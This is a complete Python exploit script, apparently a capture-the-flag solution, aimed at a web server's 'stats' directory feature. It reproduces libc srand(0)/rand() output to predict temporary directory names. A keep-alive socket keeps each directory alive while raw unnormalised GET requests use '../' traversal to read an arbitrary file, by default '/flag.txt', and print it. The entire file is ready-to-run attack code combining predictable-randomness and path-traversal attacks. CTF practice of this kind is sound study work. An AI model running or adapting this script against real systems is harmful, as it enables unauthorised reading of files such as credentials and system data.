#!/usr/bin/env python3
import argparse, ctypes, os, socket, sys, threading, time, http.client

def predict_suffixes(start_index: int, count: int):
    """
    Generate `count` successive stats suffixes starting from directory index `start_index`,
    using the *real* C srand(0)/rand() via libc. Each suffix = 8 rand() bytes -> 16 hex chars.
    """
    # load libc and set prototypes
    if sys.platform.startswith("linux"):
        libc_name = "libc.so.6"
    elif sys.platform == "darwin":
        libc_name = "libc.dylib"
    else:
        raise RuntimeError("Unsupported OS for libc rand().")

    libc = ctypes.CDLL(libc_name)
    libc.srand.argtypes = [ctypes.c_uint]
    libc.rand.restype = ctypes.c_int

    libc.srand(0)

    # Fast-forward to start_index (each dir consumes 8 rand() calls)
    burn = start_index * 8
    for _ in range(burn):
        libc.rand()

    # Produce `count` suffixes
    out = []
    for _ in range(count):
        bytes8 = []
        for _ in range(8):
            r = libc.rand()
            b = r & 0xFF
            bytes8.append(f"{b:02x}")
        out.append("".join(bytes8))
    return out

def keepalive_holder(host: str, port: int, probe: str, ready_evt: threading.Event):
    """
    Open a raw TCP socket, send GET /<probe>.txt with Connection: keep-alive, then *do nothing*.
    This keeps the server’s stats dir on disk until the socket is closed.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    req = (
        f"GET /{probe}.txt HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("ascii")
    s.sendall(req)
    # We could read the response headers/body, but it's not necessary.
    ready_evt.set()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        try: s.shutdown(socket.SHUT_RDWR)
        except Exception: pass
        s.close()

def http_get_raw(host: str, port: int, path: str, timeout: float = 3.0):
    """
    Issue a raw HTTP/1.1 GET with the path sent *exactly as provided* (no normalization).
    """
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    # http.client leaves the path untouched; that’s what we want.
    conn.putrequest("GET", path, skip_host=True, skip_accept_encoding=True)
    conn.putheader("Host", f"{host}:{port}")
    conn.putheader("Connection", "close")
    conn.endheaders()
    resp = conn.getresponse()
    body = resp.read()
    conn.close()
    return resp.status, resp.reason, body

def main():
    ap = argparse.ArgumentParser(description="Stats-dir traversal exploit (local & remote).")
    ap.add_argument("--base", default="127.0.0.1:1337", help="host:port (default: 127.0.0.1:1337)")
    ap.add_argument("--probe", default="probe", help="basename for probe (creates <probe>.txt)")
    ap.add_argument("--index", type=int, default=0, help="dir index to try first (0 after fresh start)")
    ap.add_argument("--window", type=int, default=1, help="number of successive indices to try")
    ap.add_argument("--depth", type=int, default=3, help="number of ../ to climb (3 is /app -> /)")
    ap.add_argument("--target", default="/flag.txt", help="target file after traversal")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    host, port_str = args.base.split(":")
    port = int(port_str)

    # 1) Start holder thread to keep stats dir alive
    holder_ready = threading.Event()
    t = threading.Thread(target=keepalive_holder, args=(host, port, args.probe, holder_ready), daemon=True)
    t.start()
    holder_ready.wait(2.0)  # give it a moment to send the request

    # 2) Predict candidate suffixes (from real libc rand)
    suffixes = predict_suffixes(args.index, args.window)

    # 3) Try each candidate
    traversal = "/".join([".."] * args.depth)
    if traversal: traversal += "/"
    for i, suf in enumerate(suffixes):
        trial_index = args.index + i
        path = f"/stats/{suf}_{args.probe}.txt/{traversal}{args.target.lstrip('/')}"
        if args.verbose:
            print(f"[*] Trying index={trial_index} suffix={suf} path={path}")
        try:
            status, reason, body = http_get_raw(host, port, path, timeout=4.0)
        except Exception as e:
            if args.verbose:
                print(f"[!] Request failed: {e}")
            continue

        if args.verbose:
            print(f"[+] {status} {reason}")
        if status == 200 and body:
            print("===== FLAG =====")
            try:
                sys.stdout.write(body.decode("utf-8", errors="replace"))
            except Exception:
                sys.stdout.buffer.write(body)
            print("\n================")
            return
        # keep going on 400/404/etc.

    print("[-] No hit in window. Try increasing --index/--window, and keep the holder running longer.")
    print("    Tip: if server just started, use --index 0 --window 1.")

if __name__ == "__main__":
    main()
